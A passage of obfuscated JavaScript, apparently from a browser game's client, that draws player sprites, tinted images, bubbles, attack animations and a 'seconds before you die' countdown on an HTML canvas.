				}
			}
		};

		function ᐃᐃⲆᐃⲆⵠⲆ() {
			if (this.Ⲇⵠⵠⵠᐃ || 0 === this.ᐃⵠⵠΔⵠ) return;
			if (this.r.x != this.x || this.r.y != this.y) {
				var ⲆᐃΔ = (ΔΔⲆᐃ.ⲆΔⲆⵠⵠⲆⵠ(this.x, this.y, this.r.x, this.r.y) + Math.PI / ⵠΔᐃᐃⵠ) % (2 * Math.PI);
				this.ⵠⵠⲆΔᐃ = ΔΔⲆᐃ.ᐃᐃᐃⲆⵠⲆᐃ(ⲆᐃΔ, this.ⵠⵠⲆΔᐃ);
				this.ⵠⵠⲆΔᐃ = ΔΔⲆᐃ.ⲆⲆᐃⲆΔ(this.ⵠⵠⲆΔᐃ, ⲆᐃΔ, .018)
			}
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.ⵠⵠⲆΔᐃ);
			if (ᐃᐃ.ⵠΔΔⲆⵠ === this.ᐃⵠⵠΔⵠ) {
				if (this.ᐃᐃΔᐃᐃ > 50 || this.ΔᐃᐃⲆⵠ > 0) {
					if (this.ᐃᐃΔᐃᐃ > 50) this.ΔᐃᐃⲆⵠ = Math.min(ᐃᐃⵠ, this.ΔᐃᐃⲆⵠ + ᐃⵠᐃᐃ);
					else this.ΔᐃᐃⲆⵠ = Math.max(ᐃⵠⲆ, this.ΔᐃᐃⲆⵠ - ᐃⵠᐃᐃ);
					Δ.globalAlpha = this.ΔᐃᐃⲆⵠ;
					var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠⲆΔᐃΔΔ][ⲆⲆⲆ.time];
					ⲆΔΔⵠΔ(Ⲇ.ᐃⵠⲆΔᐃΔΔ, ᐃⵠ, -ᐃⵠ.width / 4, -ᐃⵠ.height / 4);
					Δ.globalAlpha = 1
				}
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠΔΔⲆⵠ][ⲆⲆⲆ.time];
				ⲆΔΔⵠΔ(Ⲇ.ⵠΔΔⲆⵠ, ᐃⵠ, -ᐃⵠ.width / 4, -ᐃⵠ.height / ⲆᐃᐃΔ)
			} else if (ᐃᐃ.ΔΔΔⲆⲆ === this.ᐃⵠⵠΔⵠ) {
				this.ⲆⲆᐃΔⵠ = ΔΔⲆᐃ.ⲆⲆᐃⲆΔ(this.ⲆⲆᐃΔⵠ, this.ᐃᐃΔᐃᐃ, .018);
				this.ᐃⲆΔⵠΔⲆⲆ.ⵠⲆᐃ();
				if (this.ᐃᐃΔᐃᐃ > 85) this.ΔᐃᐃⲆⵠ = Math.min(ᐃᐃⲆΔ, this.ΔᐃᐃⲆⵠ + ᐃⵠᐃᐃ / 4);
				else this.ΔᐃᐃⲆⵠ = Math.max(.1, this.ΔᐃᐃⲆⵠ - ᐃⵠᐃᐃ);
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔⲆΔᐃⲆⲆⵠ][ⲆⲆⲆ.time];
				ⲆΔΔⵠΔ(Ⲇ.ΔⲆΔᐃⲆⲆⵠ, ᐃⵠ, -ᐃⵠ.width / 4, -ᐃⵠ.height / 4);
				ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠⵠΔⵠⲆⲆ][ⲆⲆⲆ.time];
				ᐃⵠⵠ = -ᐃⵠ.width;
				ⵠⵠᐃ = -ᐃⵠ.height;
				Δ.save();
				Δ.translate(-20 * ᐃ, ᐃ * -20);
				Δ.rotate(this.ᐃⲆΔⵠΔⲆⲆ.ΔᐃΔ * this.ΔᐃᐃⲆⵠ);
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ⲆⲆⲆΔ, -ⵠⵠᐃ / 4, ᐃⵠⵠ / ᐃⲆⵠᐃ, ⵠⵠᐃ / 2);
				Δ.restore();
				ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆⲆⲆⲆΔⵠ][ⲆⲆⲆ.time];
				Δ.save();
				Δ.translate(20 * ᐃ, ᐃ * -ᐃᐃⵠⵠⲆ);
				Δ.rotate(-this.ᐃⲆΔⵠΔⲆⲆ.ΔᐃΔ * this.ΔᐃᐃⲆⵠ);
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 4, -ⵠⵠᐃ / 4, ᐃⵠⵠ / ᐃⲆΔⲆ, ⵠⵠᐃ / 2);
				Δ.restore()
			} else if (ᐃᐃ.ΔⵠⵠΔⲆ === this.ᐃⵠⵠΔⵠ) {
				this.ⲆⲆᐃΔⵠ = ΔΔⲆᐃ.ⲆⲆᐃⲆΔ(this.ⲆⲆᐃΔⵠ, this.ᐃᐃΔᐃᐃ, .018);
				this.ᐃⲆΔⵠΔⲆⲆ.ⵠⲆᐃ();
				if (this.ᐃᐃΔᐃᐃ > 85) this.ΔᐃᐃⲆⵠ = Math.min(1, this.ΔᐃᐃⲆⵠ + ᐃⵠᐃᐃ / ⲆⵠᐃΔ);
				else this.ΔᐃᐃⲆⵠ = Math.max(.1, this.ΔᐃᐃⲆⵠ - ᐃⵠᐃᐃ);
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠⵠΔ][ⲆⲆⲆ.time];
				ⲆΔΔⵠΔ(Ⲇ.ⵠΔⲆᐃⵠⵠΔ, ᐃⵠ, -ᐃⵠ.width / 4, -ᐃⵠ.height / Ⲇⵠⵠⵠ);
				ᐃⵠ = ⵠⲆ[Ⲇ.ᐃΔⲆⲆⲆᐃⵠ][ⲆⲆⲆ.time];
				ᐃⵠⵠ = -ᐃⵠ.width;
				ⵠⵠᐃ = -ᐃⵠ.height;
				Δ.save();
				Δ.translate(-40 * ᐃ, ᐃ * -45);
				Δ.rotate(this.ΔᐃᐃⲆⵠ * this.ᐃⲆΔⵠΔⲆⲆ.ΔᐃΔ);
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ⵠΔΔᐃΔ, -ⵠⵠᐃ / 4, ᐃⵠⵠ / Ⲇⵠⵠᐃ, ⵠⵠᐃ / 2);
				Δ.restore();
				ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⲆΔᐃⲆⵠⵠ][ⲆⲆⲆ.time];
				Δ.save();
				Δ.translate(ᐃ * 40, -45 * ᐃ);
				Δ.rotate(this.ΔᐃᐃⲆⵠ * -this.ᐃⲆΔⵠΔⲆⲆ.ΔᐃΔ);
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ⲆⲆⲆΔ, -ⵠⵠᐃ / ⵠⲆⵠᐃ, ᐃⵠⵠ / 2, ⵠⵠᐃ / ⲆⵠΔΔ);
				Δ.restore()
			} else if (this.ᐃⵠⵠΔⵠ === ᐃᐃ.ⵠⲆᐃⲆᐃ) {
				this.ⲆⲆᐃΔⵠ = ΔΔⲆᐃ.ⲆⲆᐃⲆΔ(this.ⲆⲆᐃΔⵠ, this.ᐃᐃΔᐃᐃ, .018);
				this.ᐃⲆΔⵠΔⲆⲆ.ⵠⲆᐃ();
				if (85 < this.ᐃᐃΔᐃᐃ) this.ΔᐃᐃⲆⵠ = Math.min(1, this.ΔᐃᐃⲆⵠ + ᐃⵠᐃᐃ / ⲆⵠᐃⲆ);
				else this.ΔᐃᐃⲆⵠ = Math.max(.1, this.ΔᐃᐃⲆⵠ - ᐃⵠᐃᐃ);
				var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⲆⲆᐃ][ⲆⲆⲆ.time];
				ⲆΔΔⵠΔ(Ⲇ.ᐃⲆⵠⵠⲆⲆᐃ, ᐃⵠ, -ᐃⵠ.width / 4, -ᐃⵠ.height / ΔΔⵠⵠΔ);
				ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃΔⵠᐃΔⲆ][ⲆⲆⲆ.time];
				ᐃⵠⵠ = -ᐃⵠ.width;
				ⵠⵠᐃ = -ᐃⵠ.height;
				Δ.save();
				Δ.translate(ᐃ * -40, -45 * ᐃ);
				Δ.rotate(this.ᐃⲆΔⵠΔⲆⲆ.ΔᐃΔ * this.ΔᐃᐃⲆⵠ);
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ΔⲆᐃⵠᐃ, -ⵠⵠᐃ / ⲆⵠᐃΔ, ᐃⵠⵠ / ⵠΔᐃᐃⵠ, ⵠⵠᐃ / ⵠⵠⵠΔ);
				Δ.restore();
				ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃᐃⵠΔᐃⵠ][ⲆⲆⲆ.time];
				Δ.save();
				Δ.translate(40 * ᐃ, ᐃ * -45);
				Δ.rotate(this.ΔᐃᐃⲆⵠ * -this.ᐃⲆΔⵠΔⲆⲆ.ΔᐃΔ);
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 4, -ⵠⵠᐃ / ⵠᐃᐃⲆ, ᐃⵠⵠ / ᐃⲆⵠᐃΔ, ⵠⵠᐃ / 2);
				Δ.restore()
			} else if (this.ᐃⵠⵠΔⵠ === ᐃᐃ.ⲆᐃᐃⵠⲆ) {
				this.ⲆⲆᐃΔⵠ = ΔΔⲆᐃ.ⲆⲆᐃⲆΔ(this.ⲆⲆᐃΔⵠ, this.ᐃᐃΔᐃᐃ, .018);
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃᐃⵠⲆ][ⲆⲆⲆ.time];
				ⲆΔΔⵠΔ(Ⲇ.ⲆᐃᐃⵠⲆ, ᐃⵠ, -ᐃⵠ.width / 4, -ᐃⵠ.height / ΔⲆⲆⲆ)
			} else if (this.ᐃⵠⵠΔⵠ === ᐃᐃ.ΔᐃⲆΔᐃ) {
				this.ⲆⲆᐃΔⵠ = ΔΔⲆᐃ.ⲆⲆᐃⲆΔ(this.ⲆⲆᐃΔⵠ, this.ᐃᐃΔᐃᐃ, .018);
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔᐃⲆΔᐃ][ⲆⲆⲆ.time];
				ⲆΔΔⵠΔ(Ⲇ.ΔᐃⲆΔᐃ, ᐃⵠ, -ᐃⵠ.width / ⲆⵠΔⵠ, -ᐃⵠ.height / ⵠΔᐃΔ)
			} else if (ᐃᐃ.ᐃᐃΔΔⵠ === this.ᐃⵠⵠΔⵠ) {
				var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃᐃΔΔⵠ][ⲆⲆⲆ.time];
				ⲆΔΔⵠΔ(Ⲇ.ᐃᐃΔΔⵠ, ᐃⵠ, -ᐃⵠ.width / 4, -ᐃⵠ.height / 4)
			} else if (ᐃᐃ.ⲆⵠᐃⵠⲆ === this.ᐃⵠⵠΔⵠ) {
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠΔᐃΔᐃᐃΔ][ⲆⲆⲆ.time];
				85 < this.ᐃᐃΔᐃᐃ ? this.ΔᐃᐃⲆⵠ = Math.min(1, this.ΔᐃᐃⲆⵠ + ᐃⵠᐃᐃ / ⲆⲆⲆΔ) : this.ΔᐃᐃⲆⵠ = Math.max(ⵠᐃⲆᐃ, this.ΔᐃᐃⲆⵠ - ᐃⵠᐃᐃ);
				this.ΔᐃΔⲆⵠ += 60 * ᐃⵠᐃᐃ;
				if (60 < this.ΔᐃΔⲆⵠ) this.ΔᐃΔⲆⵠ -= 60;
				var ΔⲆⵠⲆΔ = (-ⵠΔΔΔΔⵠⲆ + 12 * (30 > this.ΔᐃΔⲆⵠ ? this.ΔᐃΔⲆⵠ / 30 : ⵠΔᐃ - (this.ΔᐃΔⲆⵠ - 30) / 30)) * this.ΔᐃᐃⲆⵠ;
				ⲆΔΔⵠΔ(Ⲇ.ⵠΔᐃΔᐃᐃΔ, ᐃⵠ, -ᐃⵠ.width / ΔⲆᐃⵠᐃ, -ᐃⵠ.height / 4 + ΔⲆⵠⲆΔ)
			} else if (ᐃᐃ.ⲆᐃⵠⵠⲆ === this.ᐃⵠⵠΔⵠ) {
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔⲆΔⵠⵠⵠⲆ][ⲆⲆⲆ.time];
				85 < this.ᐃᐃΔᐃᐃ ? this.ΔᐃᐃⲆⵠ = Math.min(ᐃᐃⲆΔ, this.ΔᐃᐃⲆⵠ + ᐃⵠᐃᐃ / 4) : this.ΔᐃᐃⲆⵠ = Math.max(0, this.ΔᐃᐃⲆⵠ - ᐃⵠᐃᐃ);
				this.ΔᐃΔⲆⵠ += ᐃⵠᐃᐃ * 60;
				60 < this.ΔᐃΔⲆⵠ && (this.ΔᐃΔⲆⵠ -= 60);
				var ΔⲆⵠⲆΔ = (-6 + (this.ΔᐃΔⲆⵠ < 30 ? this.ΔᐃΔⲆⵠ / 30 : 1 - (this.ΔᐃΔⲆⵠ - 30) / 30) * 12) * this.ΔᐃᐃⲆⵠ;
				ⲆΔΔⵠΔ(Ⲇ.ΔⲆΔⵠⵠⵠⲆ, ᐃⵠ, -ᐃⵠ.width / ⵠΔᐃΔ, -ᐃⵠ.height / ᐃⲆᐃⲆⵠ + ΔⲆⵠⲆΔ)
			} else if (this.ᐃⵠⵠΔⵠ === ᐃᐃ.ᐃⵠᐃᐃΔ) {
				var ΔᐃᐃⵠⲆ = Math.PI / ⲆᐃᐃⲆ;
				var ΔΔᐃⲆⲆⲆΔ = Math.PI / ⵠᐃᐃⲆ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃΔⵠⵠᐃⵠΔ][ⲆⲆⲆ.time];
				if (this.ᐃᐃΔᐃᐃ > 85) this.ΔᐃᐃⲆⵠ = Math.min(ᐃⲆᐃ, this.ΔᐃᐃⲆⵠ + ᐃⵠᐃᐃ / 4);
				else this.ΔᐃᐃⲆⵠ = Math.max(0, this.ΔᐃᐃⲆⵠ - ᐃⵠᐃᐃ);
				this.ΔᐃΔⲆⵠ += 60 * ᐃⵠᐃᐃ;
				if (60 < this.ΔᐃΔⲆⵠ) this.ΔᐃΔⲆⵠ -= 60;
				var ΔⲆⵠⲆΔ = this.ΔᐃᐃⲆⵠ * (-6 + ᐃⲆⵠᐃⵠ * (this.ΔᐃΔⲆⵠ < 30 ? this.ΔᐃΔⲆⵠ / 30 : 1 - (this.ΔᐃΔⲆⵠ - 30) / 30));
				ⲆΔΔⵠΔ(Ⲇ.ᐃΔⵠⵠᐃⵠΔ, ᐃⵠ, -ᐃⵠ.width / 4 + ΔⲆⵠⲆΔ, -ᐃⵠ.height / ⲆⲆⲆΔ);
				Δ.restore();
				Δ.save();
				Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
				Δ.rotate(Math.PI + this.ⵠⵠⲆΔᐃ + ΔΔᐃⲆⲆⲆΔ);
				Δ.translate(120, ΔⲆⵠⲆΔ);
				Δ.rotate(ΔᐃᐃⵠⲆ);
				ᐃⵠ = ⵠⲆ[Ⲇ.ⲆΔⵠᐃΔᐃⲆ][ⲆⲆⲆ.time];
				ᐃⵠⵠ = -ᐃⵠ.width;
				ⵠⵠᐃ = -ᐃⵠ.height;
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / Ⲇᐃᐃⵠ, -ⵠⵠᐃ / ⲆΔΔⵠ, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.restore();
				Δ.save();
				Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
				Δ.rotate(Math.PI + this.ⵠⵠⲆΔᐃ + ΔᐃᐃⵠⲆ + ΔΔᐃⲆⲆⲆΔ);
				Δ.translate(120, ΔⲆⵠⲆΔ);
				Δ.rotate(ΔᐃᐃⵠⲆ);
				ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆΔΔⵠᐃⵠ][ⲆⲆⲆ.time];
				ᐃⵠⵠ = -ᐃⵠ.width;
				ⵠⵠᐃ = -ᐃⵠ.height;
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / ᐃⵠⲆⲆⲆ, ᐃⵠⵠ, ⵠⵠᐃ)
			}
			Δ.restore()
		}
		ΔᐃⵠⵠⲆⲆⵠⲆⵠ = 0;
		ⲆᐃⲆⲆΔᐃⲆⵠⲆ = 1;
		ᐃᐃΔᐃᐃⵠΔᐃⵠ = 2;
		ΔⲆᐃΔⵠⲆΔⲆΔ = 3;
		ΔᐃⲆⵠⵠΔᐃΔᐃ = ΔΔⵠⵠΔ;
		ⵠⵠΔΔΔᐃΔ = [
			[],
			[],
			[],
			[],
			[]
		];
		ΔⵠΔΔⵠΔᐃⲆⲆ = [ⵠ[212], "#00BB00", "#1CE7E0", "#DBE71C", ⵠ[212]];

		function ⵠⵠⵠΔⲆⲆΔ(ΔΔᐃⲆⲆⵠᐃ, ⵠⲆⵠⵠᐃⵠⲆ, ⵠᐃⲆΔⵠ) {
			if (ⵠⲆⵠⵠᐃⵠⲆ.ΔⲆᐃΔΔᐃΔ() !== ΔⲆⵠ) return ⵠⲆⵠⵠᐃⵠⲆ;
			var ΔⲆΔᐃⵠⵠΔ = ⵠⵠΔΔΔᐃΔ[ⵠᐃⲆΔⵠ][ΔΔᐃⲆⲆⵠᐃ];
			if (ΔⲆΔᐃⵠⵠΔ === ⵠᐃⵠⲆΔ) {
				ΔⲆΔᐃⵠⵠΔ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
				var ⲆⵠⵠΔᐃΔΔ = ΔⲆΔᐃⵠⵠΔ.getContext(ⵠ[289]);
				var ⵠⲆⵠ = ⵠⲆⵠⵠᐃⵠⲆ.width;
				var ΔΔⲆ = ⵠⲆⵠⵠᐃⵠⲆ.height;
				ΔⲆΔᐃⵠⵠΔ.width = ⵠⲆⵠ;
				ΔⲆΔᐃⵠⵠΔ.height = ΔΔⲆ;
				ⲆⵠⵠΔᐃΔΔ.drawImage(ⵠⲆⵠⵠᐃⵠⲆ, 0, 0);
				ⲆⵠⵠΔᐃΔΔ.globalCompositeOperation = "source-in";
				ⲆⵠⵠΔᐃΔΔ.fillStyle = ΔⵠΔΔⵠΔᐃⲆⲆ[ⵠᐃⲆΔⵠ];
				ⲆⵠⵠΔᐃΔΔ.fillRect(0, Δᐃᐃᐃ, ⵠⲆⵠ, ΔΔⲆ);
				ⵠⵠΔΔΔᐃΔ[ⵠᐃⲆΔⵠ][ΔΔᐃⲆⲆⵠᐃ] = ΔⲆΔᐃⵠⵠΔ
			}
			return ΔⲆΔᐃⵠⵠΔ
		}

		function ᐃΔⲆᐃⵠΔⲆⲆᐃ() {
			if (this.enabled && ᐃⵠⲆ <= this.ΔⲆΔⲆΔ) {
				var ΔⲆⲆⵠΔᐃᐃⵠⵠ = (new Date).getTime();
				var Δᐃᐃ = ΔⲆⲆⵠΔᐃᐃⵠⵠ - this.ΔⲆΔⲆΔ;
				var ᐃⲆΔΔΔ = Δᐃᐃ % 1e3 / 1e3;
				ᐃⲆΔΔΔ > .5 ? ᐃⲆΔΔΔ = 1 - ΔⵠⵠΔ * (ᐃⲆΔΔΔ - .5) : ᐃⲆΔΔΔ *= 2;
				Δᐃᐃ = Math.floor(Δᐃᐃ / 1e3);
				if (ΔᐃᐃΔ.ⵠΔᐃᐃΔΔᐃ > Δᐃᐃ) {
					Δᐃᐃ = ΔᐃᐃΔ.ⵠΔᐃᐃΔΔᐃ - Δᐃᐃ;
					if (!this.label) {
						this.label = ᐃᐃΔΔᐃ(ᐃ, " seconds before you die", 40, ⵠ[429], null, null, null, null, null, ⵠ[481], ⵠⲆⲆᐃⵠ)
					}(Δᐃᐃ != this.now || !this.ᐃⲆᐃΔᐃᐃⵠ) && (this.now = Δᐃᐃ, this.ᐃⲆᐃΔᐃᐃⵠ = ᐃᐃΔΔᐃ(ᐃ, "" + Δᐃᐃ, 40, ⵠ[429], null, null, null, null, null, ⵠ[481], 10));
					ΔⲆΔⵠ(Δ, this.label, (ΔΔΔᐃ - this.label.width) / ⵠⵠⵠΔ, ⵠⲆⲆᐃⵠΔⵠ * ᐃ);
					Δ.globalAlpha = ᐃⲆΔΔΔ;
					ΔⲆΔⵠ(Δ, this.ᐃⲆᐃΔᐃᐃⵠ, (ΔΔΔᐃ - this.label.width) / ᐃⲆⵠᐃ - this.ᐃⲆᐃΔᐃᐃⵠ.width + 15 * ᐃ, ᐃ * ᐃⵠΔᐃᐃ);
					Δ.globalAlpha = ΔⲆᐃᐃ
				}
			}
		}

		function ᐃΔⲆΔⲆⲆΔΔⵠ() {
			var ᐃⲆᐃⵠⵠⲆΔ = ᐃⵠⲆ;
			switch (this.right) {
				case Ⲇ.ⵠⲆⲆⲆΔ:
				case Ⲇ.ΔᐃⵠΔⲆ:
				case Ⲇ.ⲆΔⲆⵠⵠ:
				case Ⲇ.ⲆᐃⵠᐃⲆ:
				case Ⲇ.ⲆⵠⵠΔᐃ:
				case Ⲇ.ᐃᐃᐃⵠΔ:
					var ᐃⲆᐃⵠⵠⲆΔ = 1;
					break
			}
			if (this.Ⲇⵠⵠⵠᐃ) {
				for (var ⵠᐃ = 0; this.bubbles.length > ⵠᐃ; ⵠᐃ++) {
					var ⲆᐃΔⲆ = this.bubbles[ⵠᐃ];
					if (ⲆᐃΔⲆ.ᐃⵠΔᐃⵠ > .5) var ᐃⲆΔΔΔ = ᐃᐃⵠ - (ⲆᐃΔⲆ.ᐃⵠΔᐃⵠ - .5) * 2;
					else var ᐃⲆΔΔΔ = ᐃⵠⲆⲆⲆ * ⲆᐃΔⲆ.ᐃⵠΔᐃⵠ;
					Δ.globalAlpha = ᐃⲆΔΔΔ;
					var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠᐃᐃᐃⵠᐃⲆ][ⲆⲆⲆ.time][ⲆᐃΔⲆ.id];
					ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃᐃΔ.ⲆΔΔ.x + ⲆᐃΔⲆ.x - ᐃⵠ.width / 2, ᐃᐃΔ.ⲆΔΔ.y + ⲆᐃΔⲆ.y - ᐃⵠ.height / 2);
					Δ.globalAlpha = 1
				}
				return
			}
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			ⲆⲆⲆ.ⵠᐃᐃΔᐃⲆⲆΔΔ(this);
			this.action & ⵠⵠⵠⲆ.ᐃⵠⵠᐃⵠⵠⵠ && ΔⲆΔⵠⵠᐃᐃᐃΔ(this);
			Δ.save();
			Δ.rotate(this.angle - Math.PI / ᐃⲆⵠᐃ);
			if (!(this.action & ⵠⵠⵠⲆ.ᐃⵠⵠᐃⵠⵠⵠ)) {
				if (this.action & ⵠⵠⵠⲆ.IDLE || Ⲇᐃⵠⵠ !== this.ᐃⵠⵠΔⵠ) {
					this.ᐃᐃᐃᐃⲆⵠΔ.ⵠⲆᐃ()
				} else this.action & ⵠⵠⵠⲆ.ⵠⵠⲆΔⵠⲆⲆ && this.ⵠⵠᐃᐃⵠᐃΔ.ⵠⲆᐃ()
			}
			var Δⵠ = this.ᐃᐃᐃᐃⲆⵠΔ.ΔᐃΔ;
			var ⲆⵠⲆ = this.ⵠⵠᐃᐃⵠᐃΔ.ΔᐃΔ;
			var ⵠⵠΔⲆⲆ;
			if (Ⲇ.ΔᐃᐃΔᐃ === this.Ⲇⵠᐃᐃᐃ) {
				ᐃⵠ = ⵠⲆ[Ⲇ.ΔᐃᐃⵠΔ][ⲆⲆⲆ.time];
				ⵠⵠΔⲆⲆ = Ⲇ.ΔᐃᐃⵠΔ
			} else if (Ⲇ.ᐃⵠᐃⲆⲆ === this.Ⲇⵠᐃᐃᐃ) {
				ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⵠ][ⲆⲆⲆ.time];
				ⵠⵠΔⲆⲆ = Ⲇ.ᐃⲆⵠⵠⵠ
			} else if (this.Ⲇⵠᐃᐃᐃ === Ⲇ.ᐃᐃΔΔΔ) {
				ᐃⵠ = ⵠⲆ[Ⲇ.ΔᐃᐃⵠⲆΔᐃ][ⲆⲆⲆ.time];
				ⵠⵠΔⲆⲆ = Ⲇ.ΔᐃᐃⵠⲆΔᐃ
			} else if (Ⲇ.ΔⵠⲆΔᐃ === this.Ⲇⵠᐃᐃᐃ) {
				ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆΔⲆ][ⲆⲆⲆ.time];
				ⵠⵠΔⲆⲆ = Ⲇ.ⵠⵠᐃᐃⲆΔⲆ
			} else this.ᐃⲆΔᐃⲆᐃΔ ? (ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠⲆΔΔⵠΔ][ⲆⲆⲆ.time], ⵠⵠΔⲆⲆ = Ⲇ.ⵠⵠⲆΔΔⵠΔ) : (ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆᐃΔᐃ][this.ⲆⵠⲆᐃ][ⲆⲆⲆ.time], ⵠⵠΔⲆⲆ = Ⲇ.ᐃⲆᐃΔᐃ);
			ᐃⵠΔⲆ = ⵠⲆ[Ⲇ.ΔᐃⲆᐃΔ][ⲆⲆⲆ.time];
			var ΔⲆⲆⲆᐃ = ᐃⵠ;
			var ⵠᐃᐃᐃᐃ = ⵠⵠΔⲆⲆ;
			if (this.action & ⵠⵠⵠⲆ.ᐃⵠⵠᐃⵠⵠⵠ) {
				if (this.attack.ⵠⲆᐃ() && this.attack.ᐃⲆΔ == ⵠᐃΔΔⵠ) {
					this.ΔⲆⲆⲆᐃ = !this.ΔⲆⲆⲆᐃ;
					this.action -= ⵠⵠⵠⲆ.ᐃⵠⵠᐃⵠⵠⵠ;
					this.ⲆᐃΔΔ == ᐃᐃΔ.ⲆᐃΔΔ && (ᐃᐃΔ.control.ⲆⲆⵠⵠ = ΔΔⵠⵠ)
				}
				ΔⲆⵠⲆ <= this.right && (this.ΔⲆⲆⲆᐃ = ⲆᐃΔⲆⲆ);
				var ⵠΔᐃᐃ = this.ΔⲆⲆⲆᐃ ? this.attack.ΔᐃΔ : -this.attack.ΔᐃΔ / 3;
				var ⵠⲆⲆᐃⲆ = this.ΔⲆⲆⲆᐃ ? this.attack.ΔᐃΔ / 3 : -this.attack.ΔᐃΔ;
				if (this.ᐃⲆΔᐃⲆᐃΔ) {
					Δ.save();
					Δ.rotate(ⵠΔᐃᐃ);
					ᐃᐃⲆⲆⵠ(ⵠⵠΔⲆⲆ, ᐃⵠ, -ᐃⵠ.width / 2 - ᐃ * (66 + Δⵠ), -ᐃⵠ.height / 2 + ᐃ * (ⲆⲆΔⵠ + ⲆⵠⲆ));
					Δ.restore();
					Δ.save();
					Δ.rotate(ⵠⲆⲆᐃⲆ);
					ᐃᐃⲆⲆⵠ(ⵠⵠΔⲆⲆ, ᐃⵠ, -ᐃⵠ.width / ⵠⵠΔⲆ + ᐃ * (66 + Δⵠ), -ᐃⵠ.height / 2 + (ᐃⲆⵠΔ + ⲆⵠⲆ) * ᐃ);
					Δ.restore()
				} else {
					if (ᐃⲆᐃⵠⵠⲆΔ === 0) {
						if (this.right === Ⲇ.ⵠᐃΔⲆⵠ) ⵠΔᐃᐃ = -ΔΔⲆᐃ.ⵠΔⲆᐃᐃⵠⵠ(-ⵠΔᐃᐃ);
						Δ.save();
						Δ.rotate(ⵠΔᐃᐃ);
						ᐃᐃⲆⲆⵠ(Ⲇ.ΔᐃⲆᐃΔ, ᐃⵠΔⲆ, -ᐃⵠΔⲆ.width / 2 - (49 + Δⵠ) * ᐃ, -ᐃⵠΔⲆ.height / 2 + ᐃ * (ⲆⲆⵠⲆᐃᐃⲆ + ⲆⵠⲆ));
						if (this.right === Ⲇ.ⵠⵠⲆⵠⲆ) {
							var ΔΔⲆⲆⵠⵠΔ = ⵠⲆ[this.right][this.ⵠⲆᐃⵠⵠ][ⲆⲆⲆ.time];
							ᐃΔⲆΔΔ(this.right, this.ⵠⲆᐃⵠⵠ, ΔΔⲆⲆⵠⵠΔ, -ΔΔⲆⲆⵠⵠΔ.width / 4 - (62 + Δⵠ) * ᐃ, -ΔΔⲆⲆⵠⵠΔ.height / 4 + ᐃ * (ⲆⵠⲆ + 18))
						} else ᐃⵠΔⲆΔⵠⵠ(this.right, Δⵠ, ⲆⵠⲆ);
						if (Ⲇ.ᐃⲆⵠⵠⵠ <= ⵠⵠΔⲆⲆ) ⲆΔΔⵠΔ(ⵠⵠΔⲆⲆ, ᐃⵠ, -ᐃⵠ.width / ⵠᐃΔΔ - (49 + Δⵠ) * ᐃ, -ᐃⵠ.height / 4 + ᐃ * (11 + ⲆⵠⲆ));
						else ⵠⵠΔⲆⲆ !== Ⲇ.ΔᐃᐃⵠΔ ? ᐃΔⲆΔΔ(ⵠⵠΔⲆⲆ, this.ⲆⵠⲆᐃ, ᐃⵠ, -ᐃⵠ.width / 4 - ᐃ * (49 + Δⵠ), -ᐃⵠ.height / Ⲇᐃⵠᐃ + (ΔⲆⲆᐃᐃ + ⲆⵠⲆ) * ᐃ) : ᐃᐃⲆⲆⵠ(ⵠⵠΔⲆⲆ, ᐃⵠ, -ᐃⵠ.width / ⵠⲆⵠⲆ - (49 + Δⵠ) * ᐃ, -ᐃⵠ.height / ⲆⵠΔΔ + (11 + ⲆⵠⲆ) * ᐃ);
						Δ.restore();
						Δ.save();
						Δ.rotate(ⵠⲆⲆᐃⲆ);
						ᐃᐃⲆⲆⵠ(Ⲇ.ΔᐃⲆᐃΔ, ᐃⵠΔⲆ, -ᐃⵠΔⲆ.width / ΔⵠᐃⲆ + ᐃ * (49 + Δⵠ), -ᐃⵠΔⲆ.height / 2 + (15 + ⲆⵠⲆ) * ᐃ);
